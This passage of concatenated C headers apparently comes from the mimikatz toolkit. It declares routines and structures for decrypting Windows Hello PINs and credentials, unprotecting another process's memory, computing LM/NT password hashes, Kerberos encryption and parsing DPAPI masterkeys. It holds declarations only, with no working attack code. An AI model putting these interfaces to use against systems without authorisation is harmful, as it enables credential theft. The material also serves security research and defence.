PCWCHAR kull_m_crypto_kp_mode_to_str(const DWORD keyMode);
void kull_m_crypto_pp_imptypes_descr(const DWORD implTypes);
PCWCHAR kull_m_crypto_bcrypt_interface_to_str(const DWORD interf);
PCWCHAR kull_m_crypto_bcrypt_cipher_alg_to_str(const DWORD alg);
PCWCHAR kull_m_crypto_bcrypt_asym_alg_to_str(const DWORD alg);
PCWCHAR kull_m_crypto_bcrypt_mode_to_str(const DWORD keyMode);
void kull_m_crypto_ncrypt_impl_types_descr(const DWORD implTypes);
void kull_m_crypto_ncrypt_allow_exports_descr(const DWORD allowExports);



typedef struct _KIWI_DH {
	HCRYPTPROV hProvParty;
	HCRYPTKEY hPrivateKey;
	MIMI_PUBLICKEY publicKey;
	HCRYPTKEY hSessionKey;
} KIWI_DH, *PKIWI_DH;

PKIWI_DH kull_m_crypto_dh_Delete(PKIWI_DH dh);
PKIWI_DH kull_m_crypto_dh_Create(ALG_ID targetSessionKeyType);
BOOL kull_m_crypto_dh_CreateSessionKey(PKIWI_DH dh, PMIMI_PUBLICKEY publicKey);
BOOL kull_m_crypto_dh_simpleEncrypt(HCRYPTKEY key, LPVOID data, DWORD dataLen, LPVOID *out, DWORD *outLen);
BOOL kull_m_crypto_dh_simpleDecrypt(HCRYPTKEY key, LPVOID data, DWORD dataLen, LPVOID *out, DWORD *outLen);

BOOL kull_m_crypto_StringToBinaryA(LPCSTR pszString, DWORD cchString, DWORD dwFlags, PBYTE* ppbBinary, PDWORD pcbBinary);
BOOL kull_m_crypto_StringToBinaryW(LPCWSTR pszString, DWORD cchString, DWORD dwFlags, PBYTE* ppbBinary, PDWORD pcbBinary);

#define IOCTL_GET_FEATURE_REQUEST			SCARD_CTL_CODE(3400)
#define IOCTL_CCID_ESCAPE					SCARD_CTL_CODE(3500)

// ACS
#define IOCTL_SMARTCARD_DIRECT					SCARD_CTL_CODE(2050)
#define IOCTL_SMARTCARD_SELECT_SLOT				SCARD_CTL_CODE(2051)
#define IOCTL_SMARTCARD_DRAW_LCDBMP				SCARD_CTL_CODE(2052)
#define IOCTL_SMARTCARD_DISPLAY_LCD				SCARD_CTL_CODE(2053)
#define IOCTL_SMARTCARD_CLR_LCD					SCARD_CTL_CODE(2054)
#define IOCTL_SMARTCARD_READ_KEYPAD				SCARD_CTL_CODE(2055)
#define IOCTL_SMARTCARD_READ_MAGSTRIP			SCARD_CTL_CODE(2056)
#define IOCTL_SMARTCARD_READ_RTC				SCARD_CTL_CODE(2057)
#define IOCTL_SMARTCARD_SET_RTC					SCARD_CTL_CODE(2058)
#define IOCTL_SMARTCARD_SET_OPTION				SCARD_CTL_CODE(2059)
#define IOCTL_SMARTCARD_SET_LED					SCARD_CTL_CODE(2060)
#define IOCTL_SMARTCARD_USE_ENCRYPTION			SCARD_CTL_CODE(2061)
#define IOCTL_SMARTCARD_LOAD_KEY				SCARD_CTL_CODE(2062)
#define IOCTL_SMARTCARD_COMPUTE_MAC				SCARD_CTL_CODE(2063)
#define IOCTL_SMARTCARD_DECRYPT_MAC				SCARD_CTL_CODE(2064)
#define IOCTL_SMARTCARD_READ_EEPROM				SCARD_CTL_CODE(2065)
#define IOCTL_SMARTCARD_WRITE_EEPROM			SCARD_CTL_CODE(2066)
#define IOCTL_SMARTCARD_GET_VERSION				SCARD_CTL_CODE(2067)
#define IOCTL_SMARTCARD_DUKPT_INIT_KEY			SCARD_CTL_CODE(2069)
#define IOCTL_SMARTCARD_ABORD_DUKPT_PIN			SCARD_CTL_CODE(2070)
#define IOCTL_SMARTCARD_SET_USB_VIDPID			SCARD_CTL_CODE(2071)
#define IOCTL_SMARTCARD_ACR128_ESCAPE_COMMAND	SCARD_CTL_CODE(2079)

#define IOCTL_SMARTCARD_GET_READER_INFO			SCARD_CTL_CODE(2051)
#define IOCTL_SMARTCARD_SET_CARD_TYPE			SCARD_CTL_CODE(2060)

// CYBERJACK
#define CJPCSC_VEN_IOCTRL_ESCAPE				SCARD_CTL_CODE(3103)
#define CJPCSC_VEN_IOCTRL_VERIFY_PIN_DIRECT		SCARD_CTL_CODE(3506)
#define CJPCSC_VEN_IOCTRL_MODIFY_PIN_DIRECT		SCARD_CTL_CODE(3507)
#define CJPCSC_VEN_IOCTRL_MCT_READERDIRECT		SCARD_CTL_CODE(3508)
#define CJPCSC_VEN_IOCTRL_MCT_READERUNIVERSAL	SCARD_CTL_CODE(3509)
#define CJPCSC_VEN_IOCTRL_EXECUTE_PACE			SCARD_CTL_CODE(3532)
#define CJPCSC_VEN_IOCTRL_SET_NORM				SCARD_CTL_CODE(3154)

// OMNIKEY
#define CM_IOCTL_GET_FW_VERSION					SCARD_CTL_CODE(3001)
#define CM_IOCTL_GET_LIB_VERSION				SCARD_CTL_CODE(3041) // not in doc
#define CM_IOCTL_SIGNAL							SCARD_CTL_CODE(3058)
#define CM_IOCTL_RFID_GENERIC					SCARD_CTL_CODE(3105)
#define CM_IOCTL_SET_OPERATION_MODE				SCARD_CTL_CODE(3107)
#define CM_IOCTL_GET_MAXIMUM_RFID_BAUDRATE		SCARD_CTL_CODE(3208)
#define CM_IOCTL_SET_RFID_CONTROL_FLAGS			SCARD_CTL_CODE(3213)
#define CM_IOCTL_GET_SET_RFID_BAUDRATE			SCARD_CTL_CODE(3215)

// GEMALTO
#define IOCTL_VENDOR_IFD_EXCHANGE				SCARD_CTL_CODE(2058)
#define IOCTL_SMARTCARD_PC_SC_VERIFY_PIN		SCARD_CTL_CODE(2060)
#define IOCTL_SMARTCARD_PC_SC_MODIFY_PIN		SCARD_CTL_CODE(2061)

#define FEATURE_VERIFY_PIN_START			0x01
#define FEATURE_VERIFY_PIN_FINISH			0x02
#define FEATURE_MODIFY_PIN_START			0x03
#define FEATURE_MODIFY_PIN_FINISH			0x04
#define FEATURE_GET_KEY_PRESSED				0x05
#define FEATURE_VERIFY_PIN_DIRECT			0x06
#define FEATURE_MODIFY_PIN_DIRECT			0x07
#define FEATURE_MCT_READER_DIRECT			0x08
#define FEATURE_MCT_UNIVERSAL				0x09
#define FEATURE_IFD_PIN_PROP				0x0a
#define FEATURE_ABORT						0x0b
#define FEATURE_SET_SPE_MESSAGE				0x0c
#define FEATURE_VERIFY_PIN_DIRECT_APP_ID	0x0d
#define FEATURE_MODIFY_PIN_DIRECT_APP_ID	0x0e
#define FEATURE_WRITE_DISPLAY				0x0f
#define FEATURE_GET_KEY						0x10
#define FEATURE_IFD_DISPLAY_PROPERTIES		0x11
#define FEATURE_GET_TLV_PROPERTIES			0x12
#define FEATURE_CCID_ESC_COMMAND			0x13
#define FEATURE_EXECUTE_PACE				0x20

#pragma pack(push, 1)
typedef struct _KIWI_TLV_FEATURE {
	BYTE Tag;
	BYTE Length; // 4
	DWORD ControlCode; // BE
} KIWI_TLV_FEATURE, *PKIWI_TLV_FEATURE;
#pragma pack(pop)

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kull_m_crypto.h"
//#include "kull_m_crypto_sk.h"

typedef struct _KIWI_POPKEY {
	DWORD version;
	DWORD type; // 1 soft, 2 hard
	BYTE key[ANYSIZE_ARRAY];
} KIWI_POPKEY, *PKIWI_POPKEY;

typedef struct _KIWI_POPKEY_HARD {
	DWORD version;
	DWORD cbName;
	DWORD cbKey;
	BYTE data[ANYSIZE_ARRAY];
} KIWI_POPKEY_HARD, *PKIWI_POPKEY_HARD;

typedef struct _KIWI_NGC_CREDENTIAL {
	DWORD dwVersion;
	DWORD cbEncryptedKey;
	DWORD cbIV;
	DWORD cbEncryptedPassword;
	DWORD cbUnk;
	BYTE Data[ANYSIZE_ARRAY];
	// ...
} KIWI_NGC_CREDENTIAL, *PKIWI_NGC_CREDENTIAL;

typedef struct _UNK_PIN {
	DWORD cbData;
	DWORD unk0;
	PWSTR pData;
} UNK_PIN, *PUNK_PIN;

typedef struct _UNK_PADDING {
	DWORD unk0;
	DWORD unk1;
	PUNK_PIN pin;
} UNK_PADDING, *PUNK_PADDING;

typedef SECURITY_STATUS	(WINAPI * PNCRYPTKEYDERIVATION) (NCRYPT_KEY_HANDLE hKey, NCryptBufferDesc *pParameterList, PUCHAR pbDerivedKey, DWORD cbDerivedKey, DWORD *pcbResult, ULONG dwFlags); // tofix
typedef NTSTATUS (WINAPI * PNGCSIGNWITHSYMMETRICPOPKEY) (PBYTE pbKey, DWORD cbKey, PBYTE pbLabel, DWORD cbLabel, PBYTE pbContext, DWORD cbContext, PBYTE pbData, DWORD cbData, PBYTE *ppbOutput, PDWORD pcbOutput); // tofix

BOOL kull_m_crypto_ngc_keyvalue_derived_software(PBYTE pbLabel, DWORD cbLabel, PBYTE pbContext, DWORD cbContext, LPCBYTE Key, DWORD cbKey, PBYTE DerivedKey, DWORD cbDerivedKey);
BOOL kull_m_crypto_ngc_keyvalue_derived_hardware(PBYTE pbLabel, DWORD cbLabel, PBYTE pbContext, DWORD cbContext, LPCWSTR TransportKeyName, LPCBYTE Key, DWORD cbKey, PBYTE DerivedKey, DWORD cbDerivedKey);
BOOL kull_m_crypto_ngc_signature_derived(LPCBYTE pcbKey, DWORD cbKey, LPCBYTE pcbData, DWORD cbData, LPBYTE pbHash, DWORD cbHash);
BOOL kull_m_crypto_ngc_signature_pop(PBYTE pbKey, DWORD cbKey, PBYTE pbLabel, DWORD cbLabel, PBYTE pbContext, DWORD cbContext, PBYTE pbData, DWORD cbData, PBYTE *ppbOutput, PDWORD pcbOutput);

PBYTE kull_m_crypto_ngc_pin_BinaryPinToPinProperty(LPCBYTE pbBinary, DWORD cbBinary, DWORD *pcbResult);
SECURITY_STATUS kull_m_crypto_ngc_hardware_unseal(NCRYPT_PROV_HANDLE hProv, LPCBYTE pbPin, DWORD cbPin, LPCBYTE pbInput, DWORD cbInput, PBYTE *ppOutput, DWORD *pcbOutput);
SECURITY_STATUS kull_m_crypto_ngc_software_decrypt(NCRYPT_PROV_HANDLE hProv, LPCWSTR szKeyName, LPCBYTE pbPin, DWORD cbPin, LPCBYTE pbInput, DWORD cbInput, PBYTE *ppOutput, DWORD *pcbOutput);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kull_m_remotelib.h"

//typedef BOOL (WINAPI * PCRYPTPROTECTMEMORY) (__inout LPVOID pDataIn, __in DWORD cbDataIn, __in DWORD dwFlags);
typedef BOOL (WINAPI * PCRYPTUNPROTECTMEMORY) (__inout LPVOID pDataIn, __in DWORD cbDataIn, __in DWORD dwFlags);

BOOL WINAPI kull_m_crypto_remote_CryptProtectMemory_Generic(__in PKULL_M_MEMORY_HANDLE hProcess, __in BOOL bIsProtect, __inout LPVOID pDataIn, __in DWORD cbDataIn, __in DWORD dwFlags);

#define kull_m_crypto_remote_CryptProtectMemory(hProcess, pDataIn, cbDataIn, dwFlags)	kull_m_crypto_remote_CryptProtectMemory_Generic(hProcess, TRUE, pDataIn, cbDataIn, dwFlags)
#define kull_m_crypto_remote_CryptUnprotectMemory(hProcess, pDataIn, cbDataIn, dwFlags)	kull_m_crypto_remote_CryptProtectMemory_Generic(hProcess, FALSE, pDataIn, cbDataIn, dwFlags)

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kull_m_string.h"

#if !defined(BCRYPT_SP800108_CTR_HMAC_ALGORITHM)
#define BCRYPT_SP800108_CTR_HMAC_ALGORITHM	L"SP800_108_CTR_HMAC"
#define KDF_LABEL			0xD
#define KDF_CONTEXT			0xE
#define KDF_SALT			0xF
#define KDF_ITERATION_COUNT	0x10

extern NTSTATUS WINAPI BCryptKeyDerivation(IN BCRYPT_KEY_HANDLE hKey, IN OPTIONAL BCryptBufferDesc *pParameterList, OUT PUCHAR pbDerivedKey, IN ULONG cbDerivedKey, OUT ULONG *pcbResult, IN ULONG dwFlags);
#endif

#define IUMDATAPROTECT	"IUMDATAPROTECT"
typedef NTSTATUS	(WINAPI * PBCRYPT_ENCRYPT)					(__inout BCRYPT_KEY_HANDLE hKey, __in_bcount_opt(cbInput) PUCHAR pbInput, __in ULONG cbInput, __in_opt VOID *pPaddingInfo, __inout_bcount_opt(cbIV) PUCHAR pbIV, __in ULONG cbIV, __out_bcount_part_opt(cbOutput, *pcbResult) PUCHAR pbOutput, __in ULONG cbOutput, __out ULONG *pcbResult, __in ULONG dwFlags);

NTSTATUS SkpOpenAesGcmProvider(BCRYPT_ALG_HANDLE *phAlgAESGCM, DWORD *pObjectLengthAesGcm);
NTSTATUS SkpOpenKdfProvider(BCRYPT_ALG_HANDLE *phAlgSP800108, DWORD *pObjectLengthSP800108);
NTSTATUS SkpImportMasterKeyInKdf(PBYTE BootKey, DWORD cbBootKey, BCRYPT_ALG_HANDLE hAlgSP800108, DWORD ObjectLengthSP800108, BCRYPT_KEY_HANDLE *phKeySP800108, UCHAR *pbKeyObject);
NTSTATUS SkpInitSymmetricEncryption(PBYTE BootKey, DWORD cbBootKey, BCRYPT_ALG_HANDLE *phAlgAESGCM, DWORD *pObjectLengthAesGcm, BCRYPT_ALG_HANDLE *phAlgSP800108, DWORD *pObjectLengthSP800108, BCRYPT_KEY_HANDLE *phKeySP800108, PUCHAR *pbKeyObject);
NTSTATUS SkpDeriveSymmetricKey(BCRYPT_KEY_HANDLE hKey, CHAR *cLabel, ULONG cbLabel, PBYTE pContext, ULONG cbContext, PUCHAR pbDerivedKey, ULONG cbDerivedKey);
NTSTATUS SkpEncryptionWorker(PBYTE BootKey, DWORD cbBootKey, UCHAR *pbInput, ULONG cbInput, UCHAR *pbAuthData, ULONG cbAuthData, UCHAR *pKdfContext, ULONG cbKdfContext, UCHAR *pbTag, ULONG cbTag, UCHAR *pbOutput, ULONG cbOutput, BOOL Encrypt);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kull_m_string.h"



typedef struct _MD4_CTX {
	DWORD state[4];
	DWORD count[2];
	BYTE buffer[64];
	BYTE digest[MD4_DIGEST_LENGTH];
} MD4_CTX, *PMD4_CTX;

typedef struct _MD5_CTX {
	DWORD count[2];
	DWORD state[4];
	BYTE buffer[64];
	BYTE digest[MD5_DIGEST_LENGTH];
} MD5_CTX, *PMD5_CTX;

typedef struct _SHA_CTX {
	BYTE buffer[64];
	DWORD state[5];
	DWORD count[2];
	DWORD unk[6]; // to avoid error on XP
} SHA_CTX, *PSHA_CTX;

typedef struct _SHA_DIGEST {
	BYTE digest[SHA_DIGEST_LENGTH];
} SHA_DIGEST, *PSHA_DIGEST;

typedef struct _CRYPT_BUFFER {
	DWORD Length;
	DWORD MaximumLength;
	PVOID Buffer;
} CRYPT_BUFFER, *PCRYPT_BUFFER, DATA_KEY, *PDATA_KEY, CLEAR_DATA, *PCLEAR_DATA, CYPHER_DATA, *PCYPHER_DATA;

VOID WINAPI MD4Init(PMD4_CTX pCtx);
VOID WINAPI MD4Update(PMD4_CTX pCtx, LPCVOID data, DWORD cbData);
VOID WINAPI MD4Final(PMD4_CTX pCtx);

VOID WINAPI MD5Init(PMD5_CTX pCtx);
VOID WINAPI MD5Update(PMD5_CTX pCtx, LPCVOID data, DWORD cbData);
VOID WINAPI MD5Final(PMD5_CTX pCtx);

VOID WINAPI A_SHAInit(PSHA_CTX pCtx);
VOID WINAPI A_SHAUpdate(PSHA_CTX pCtx, LPCVOID data, DWORD cbData);
VOID WINAPI A_SHAFinal(PSHA_CTX pCtx, PSHA_DIGEST pDigest);

#define RtlEncryptBlock						SystemFunction001 // DES
#define RtlDecryptBlock						SystemFunction002 // DES
#define RtlEncryptStdBlock					SystemFunction003 // DES with key "KGS!@#$%" for LM hash
#define RtlEncryptData						SystemFunction004 // DES/ECB
#define RtlDecryptData						SystemFunction005 // DES/ECB
#define RtlCalculateLmOwfPassword			SystemFunction006
#define RtlCalculateNtOwfPassword			SystemFunction007
#define RtlCalculateLmResponse				SystemFunction008
#define RtlCalculateNtResponse				SystemFunction009
#define RtlCalculateUserSessionKeyLm		SystemFunction010
#define RtlCalculateUserSessionKeyNt		SystemFunction011
#define RtlEncryptLmOwfPwdWithLmOwfPwd		SystemFunction012
#define RtlDecryptLmOwfPwdWithLmOwfPwd		SystemFunction013
#define RtlEncryptNtOwfPwdWithNtOwfPwd		SystemFunction014
#define RtlDecryptNtOwfPwdWithNtOwfPwd		SystemFunction015
#define RtlEncryptLmOwfPwdWithLmSesKey		SystemFunction016
#define RtlDecryptLmOwfPwdWithLmSesKey		SystemFunction017
#define RtlEncryptNtOwfPwdWithNtSesKey		SystemFunction018
#define RtlDecryptNtOwfPwdWithNtSesKey		SystemFunction019
#define RtlEncryptLmOwfPwdWithUserKey		SystemFunction020
#define RtlDecryptLmOwfPwdWithUserKey		SystemFunction021
#define RtlEncryptNtOwfPwdWithUserKey		SystemFunction022
#define RtlDecryptNtOwfPwdWithUserKey		SystemFunction023
#define RtlEncryptLmOwfPwdWithIndex			SystemFunction024
#define RtlDecryptLmOwfPwdWithIndex			SystemFunction025
#define RtlEncryptNtOwfPwdWithIndex			SystemFunction026
#define RtlDecryptNtOwfPwdWithIndex			SystemFunction027
#define RtlGetUserSessionKeyClient			SystemFunction028
#define RtlGetUserSessionKeyServer			SystemFunction029
#define RtlEqualLmOwfPassword				SystemFunction030
#define RtlEqualNtOwfPassword				SystemFunction031
#define RtlEncryptData2						SystemFunction032 // RC4
#define RtlDecryptData2						SystemFunction033 // RC4
#define RtlGetUserSessionKeyClientBinding	SystemFunction034
#define RtlCheckSignatureInFile				SystemFunction035

NTSTATUS WINAPI RtlEncryptBlock(IN LPCBYTE ClearBlock, IN LPCBYTE BlockKey, OUT LPBYTE CypherBlock);
NTSTATUS WINAPI RtlDecryptBlock(IN LPCBYTE CypherBlock, IN LPCBYTE BlockKey, OUT LPBYTE ClearBlock);
NTSTATUS WINAPI RtlEncryptStdBlock(IN LPCBYTE BlockKey, OUT LPBYTE CypherBlock);
NTSTATUS WINAPI RtlEncryptData(IN PCLEAR_DATA ClearData, IN PDATA_KEY DataKey, OUT PCYPHER_DATA CypherData);
NTSTATUS WINAPI RtlDecryptData(IN PCYPHER_DATA CypherData, IN PDATA_KEY DataKey, OUT PCLEAR_DATA ClearData);
NTSTATUS WINAPI RtlCalculateLmOwfPassword(IN LPCSTR data, OUT LPBYTE output);
NTSTATUS WINAPI RtlCalculateNtOwfPassword(IN PCUNICODE_STRING data, OUT LPBYTE output);
NTSTATUS WINAPI RtlCalculateLmResponse(IN LPCBYTE LmChallenge, IN LPCBYTE LmOwfPassword, OUT LPBYTE LmResponse);
NTSTATUS WINAPI RtlCalculateNtResponse(IN LPCBYTE NtChallenge, IN LPCBYTE NtOwfPassword, OUT LPBYTE NtResponse);
NTSTATUS WINAPI RtlCalculateUserSessionKeyLm(IN LPCBYTE LmResponse, IN LPCBYTE LmOwfPassword, OUT LPBYTE UserSessionKey);
NTSTATUS WINAPI RtlCalculateUserSessionKeyNt(IN LPCBYTE NtResponse, IN LPCBYTE NtOwfPassword, OUT LPBYTE UserSessionKey);
NTSTATUS WINAPI RtlEncryptLmOwfPwdWithLmOwfPwd(IN LPCBYTE DataLmOwfPassword, IN LPCBYTE KeyLmOwfPassword, OUT LPBYTE EncryptedLmOwfPassword);
NTSTATUS WINAPI RtlDecryptLmOwfPwdWithLmOwfPwd(IN LPCBYTE EncryptedLmOwfPassword, IN LPCBYTE KeyLmOwfPassword, OUT LPBYTE DataLmOwfPassword);
NTSTATUS WINAPI RtlEncryptNtOwfPwdWithNtOwfPwd(IN LPCBYTE DataNtOwfPassword, IN LPCBYTE KeyNtOwfPassword, OUT LPBYTE EncryptedNtOwfPassword);
NTSTATUS WINAPI RtlDecryptNtOwfPwdWithNtOwfPwd(IN LPCBYTE EncryptedNtOwfPassword, IN LPCBYTE KeyNtOwfPassword, OUT LPBYTE DataNtOwfPassword);
NTSTATUS WINAPI RtlEncryptLmOwfPwdWithLmSesKey(IN LPCBYTE LmOwfPassword, IN LPCBYTE LmSessionKey, OUT LPBYTE EncryptedLmOwfPassword);
NTSTATUS WINAPI RtlDecryptLmOwfPwdWithLmSesKey(IN LPCBYTE EncryptedLmOwfPassword, IN LPCBYTE LmSessionKey, OUT LPBYTE LmOwfPassword);
NTSTATUS WINAPI RtlEncryptNtOwfPwdWithNtSesKey(IN LPCBYTE NtOwfPassword, IN LPCBYTE NtSessionKey, OUT LPBYTE EncryptedNtOwfPassword);
NTSTATUS WINAPI RtlDecryptNtOwfPwdWithNtSesKey(IN LPCBYTE EncryptedNtOwfPassword, IN LPCBYTE NtSessionKey, OUT LPBYTE NtOwfPassword);
NTSTATUS WINAPI RtlEncryptLmOwfPwdWithUserKey(IN LPCBYTE LmOwfPassword, IN LPCBYTE UserSessionKey, OUT LPBYTE EncryptedLmOwfPassword);
NTSTATUS WINAPI RtlDecryptLmOwfPwdWithUserKey(IN LPCBYTE EncryptedLmOwfPassword, IN LPCBYTE UserSessionKey, OUT LPBYTE LmOwfPassword);
NTSTATUS WINAPI RtlEncryptNtOwfPwdWithUserKey(IN LPCBYTE NtOwfPassword, IN LPCBYTE UserSessionKey, OUT LPBYTE EncryptedNtOwfPassword);
NTSTATUS WINAPI RtlDecryptNtOwfPwdWithUserKey(IN LPCBYTE EncryptedNtOwfPassword, IN LPCBYTE UserSessionKey, OUT LPBYTE NtOwfPassword);
NTSTATUS WINAPI RtlEncryptLmOwfPwdWithIndex(IN LPCBYTE LmOwfPassword, IN LPDWORD Index, OUT LPBYTE EncryptedLmOwfPassword);
NTSTATUS WINAPI RtlDecryptLmOwfPwdWithIndex(IN LPCBYTE EncryptedLmOwfPassword, IN LPDWORD Index, OUT LPBYTE LmOwfPassword);
NTSTATUS WINAPI RtlEncryptNtOwfPwdWithIndex(IN LPCBYTE NtOwfPassword, IN LPDWORD Index, OUT LPBYTE EncryptedNtOwfPassword);
NTSTATUS WINAPI RtlDecryptNtOwfPwdWithIndex(IN LPCBYTE EncryptedNtOwfPassword, IN LPDWORD Index, OUT LPBYTE NtOwfPassword);
NTSTATUS WINAPI RtlGetUserSessionKeyClient(IN PVOID RpcContextHandle, OUT LPBYTE UserSessionKey);
NTSTATUS WINAPI RtlGetUserSessionKeyServer(IN PVOID RpcContextHandle OPTIONAL, OUT LPBYTE UserSessionKey);
BOOLEAN WINAPI RtlEqualLmOwfPassword(IN LPCBYTE LmOwfPassword1, IN LPCBYTE LmOwfPassword2);
BOOLEAN WINAPI RtlEqualNtOwfPassword(IN LPCBYTE NtOwfPassword1, IN LPCBYTE NtOwfPassword2);
NTSTATUS WINAPI RtlEncryptData2(IN OUT PCRYPT_BUFFER pData, IN PDATA_KEY pkey);
NTSTATUS WINAPI RtlDecryptData2(IN OUT PCRYPT_BUFFER pData, IN PDATA_KEY pkey);
NTSTATUS WINAPI RtlGetUserSessionKeyClientBinding(IN PVOID RpcBindingHandle, OUT HANDLE *RedirHandle, OUT LPBYTE UserSessionKey);
ULONG WINAPI RtlCheckSignatureInFile(IN LPCWSTR filename);

#if !defined(RtlGenRandom)
#define RtlGenRandom				SystemFunction036
BOOL WINAPI RtlGenRandom(OUT LPBYTE output, IN DWORD length);
#endif

#if !defined(RtlEncryptMemory)
#define RtlEncryptMemory			SystemFunction040
NTSTATUS WINAPI RtlEncryptMemory(IN OUT LPBYTE data, DWORD length, DWORD flags);
#endif 

#if !defined(RtlDecryptMemory)
#define RtlDecryptMemory			SystemFunction041
NTSTATUS WINAPI RtlDecryptMemory(IN OUT LPBYTE data, DWORD length, DWORD flags);
#endif

#define KERB_NON_KERB_SALT					16
#define KERB_NON_KERB_CKSUM_SALT			17

typedef NTSTATUS (WINAPI * PKERB_CHECKSUM_INITIALIZE) (ULONG dwSeed, PVOID *pContext);
typedef NTSTATUS (WINAPI * PKERB_CHECKSUM_SUM) (PVOID pContext, ULONG cbData, LPCVOID pbData);
typedef NTSTATUS (WINAPI * PKERB_CHECKSUM_FINALIZE) (PVOID pContext, PVOID pbSum);
typedef NTSTATUS (WINAPI * PKERB_CHECKSUM_FINISH) (PVOID *pContext);
typedef NTSTATUS (WINAPI * PKERB_CHECKSUM_INITIALIZEEX) (LPCVOID Key, ULONG KeySize, ULONG MessageType, PVOID *pContext);
typedef NTSTATUS (WINAPI * PKERB_CHECKSUM_INITIALIZEEX2)(LPCVOID Key, ULONG KeySize, LPCVOID ChecksumToVerify, ULONG MessageType, PVOID *pContext);

typedef struct _KERB_CHECKSUM {
	ULONG CheckSumType;
	ULONG CheckSumSize;
	ULONG Attributes;
	PKERB_CHECKSUM_INITIALIZE Initialize;
	PKERB_CHECKSUM_SUM Sum;
	PKERB_CHECKSUM_FINALIZE Finalize;
	PKERB_CHECKSUM_FINISH Finish;
	PKERB_CHECKSUM_INITIALIZEEX InitializeEx;
	PKERB_CHECKSUM_INITIALIZEEX2 InitializeEx2;
} KERB_CHECKSUM, *PKERB_CHECKSUM;

typedef NTSTATUS (WINAPI * PKERB_ECRYPT_INITIALIZE) (LPCVOID pbKey, ULONG KeySize, ULONG MessageType, PVOID *pContext);
typedef NTSTATUS (WINAPI * PKERB_ECRYPT_ENCRYPT) (PVOID pContext, LPCVOID pbInput, ULONG cbInput, PVOID pbOutput, ULONG *cbOutput);
typedef NTSTATUS (WINAPI * PKERB_ECRYPT_DECRYPT) (PVOID pContext, LPCVOID pbInput, ULONG cbInput, PVOID pbOutput, ULONG *cbOutput);
typedef NTSTATUS (WINAPI * PKERB_ECRYPT_FINISH) (PVOID *pContext);
typedef NTSTATUS (WINAPI * PKERB_ECRYPT_HASHPASSWORD_NT5) (PCUNICODE_STRING Password, PVOID pbKey);
typedef NTSTATUS (WINAPI * PKERB_ECRYPT_HASHPASSWORD_NT6) (PCUNICODE_STRING Password, PCUNICODE_STRING Salt, ULONG Count, PVOID pbKey);
typedef NTSTATUS (WINAPI * PKERB_ECRYPT_RANDOMKEY) (LPCVOID Seed, ULONG SeedLength, PVOID pbKey);
typedef NTSTATUS (WINAPI * PKERB_ECRYPT_CONTROL) (ULONG Function, PVOID pContext, PUCHAR InputBuffer, ULONG InputBufferSize);

typedef struct _KERB_ECRYPT {
	ULONG EncryptionType;
	ULONG BlockSize;
	ULONG ExportableEncryptionType;
	ULONG KeySize;
	ULONG HeaderSize;
	ULONG PreferredCheckSum;
	ULONG Attributes;
	PCWSTR Name;
	PKERB_ECRYPT_INITIALIZE Initialize;
	PKERB_ECRYPT_ENCRYPT Encrypt;
	PKERB_ECRYPT_DECRYPT Decrypt;
	PKERB_ECRYPT_FINISH Finish;
	union {
		PKERB_ECRYPT_HASHPASSWORD_NT5 HashPassword_NT5;
		PKERB_ECRYPT_HASHPASSWORD_NT6 HashPassword_NT6;
	};
	PKERB_ECRYPT_RANDOMKEY RandomKey;
	PKERB_ECRYPT_CONTROL Control;
	PVOID unk0_null;
	PVOID unk1_null;
	PVOID unk2_null;
} KERB_ECRYPT, *PKERB_ECRYPT;

typedef NTSTATUS (WINAPI * PKERB_RNGFN) (PVOID pbBuffer, ULONG cbBuffer);

typedef struct _KERB_RNG {
	ULONG GeneratorId;
	ULONG Attributes;
	ULONG Seed;
	PKERB_RNGFN RngFn;
} KERB_RNG, *PKERB_RNG;

NTSTATUS WINAPI CDLocateCSystem(ULONG Type, PKERB_ECRYPT *ppCSystem);
NTSTATUS WINAPI CDLocateCheckSum(ULONG Type, PKERB_CHECKSUM *ppCheckSum);
NTSTATUS WINAPI CDLocateRng(ULONG Id, PKERB_RNG *ppRng);
NTSTATUS WINAPI CDGenerateRandomBits(LPVOID pbBuffer, ULONG cbBuffer);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kull_m_crypto.h"
//#include "kull_m_crypto_system.h"
//#include "kull_m_string.h"
//#include "kull_m_net.h"
//#include "rpc/kull_m_rpc_bkrp.h"

const GUID KULL_M_DPAPI_GUID_PROVIDER;

#define	CRYPTPROTECT_SYSTEM	0x20000000

typedef struct _KULL_M_DWORD_TO_DWORD {
	PCWSTR	name;
	DWORD	id;
} KULL_M_DWORD_TO_DWORD, *PKULL_M_DWORD_TO_DWORD;

#pragma pack(push, 4) 
typedef struct _KULL_M_DPAPI_BLOB {
	DWORD	dwVersion;
	GUID	guidProvider;
	DWORD	dwMasterKeyVersion;
	GUID	guidMasterKey;
	DWORD	dwFlags;
	
	DWORD	dwDescriptionLen;
	PWSTR	szDescription;
	
	ALG_ID	algCrypt;
	DWORD	dwAlgCryptLen;
	
	DWORD	dwSaltLen;
	PBYTE	pbSalt;
	
	DWORD	dwHmacKeyLen;
	PBYTE	pbHmackKey;
	
	ALG_ID	algHash;
	DWORD	dwAlgHashLen;

	DWORD	dwHmac2KeyLen;
	PBYTE	pbHmack2Key;
	
	DWORD	dwDataLen;
	PBYTE	pbData;
	
	DWORD	dwSignLen;
	PBYTE	pbSign;
} KULL_M_DPAPI_BLOB, *PKULL_M_DPAPI_BLOB;

typedef struct _KULL_M_DPAPI_MASTERKEY {
	DWORD	dwVersion;
	BYTE	salt[16];
	DWORD	rounds;
	ALG_ID	algHash;
	ALG_ID	algCrypt;
	PBYTE	pbKey;
	DWORD	__dwKeyLen;
} KULL_M_DPAPI_MASTERKEY, *PKULL_M_DPAPI_MASTERKEY;

